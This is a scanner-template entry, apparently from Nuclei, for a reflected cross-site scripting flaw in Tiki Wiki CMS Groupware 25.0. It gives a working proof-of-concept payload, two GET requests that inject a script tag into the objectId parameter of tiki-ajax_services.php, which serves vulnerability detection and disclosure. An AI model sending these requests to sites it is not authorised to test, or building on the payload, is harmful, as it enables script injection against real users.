# Nuclei Template: Tiki Wiki CMS Groupware v25.0 - Cross Site Scripting
**Template ID:** tikiwiki-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**Source:** Nuclei Template (`tikiwiki-xss.yaml`)

## Vulnerability Information & PoC

## Description
Tiki Wiki CMS Groupware version 25.0 suffers from a cross site scripting vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/tiki/tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=<script>alert(document.domain)</script>
GET {{BaseURL}}/tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=<script>alert(document.domain)</script>
```

## References
- https://packetstormsecurity.com/files/170446/Tiki-Wiki-CMS-Groupware-25.0-Cross-Site-Scripting.html
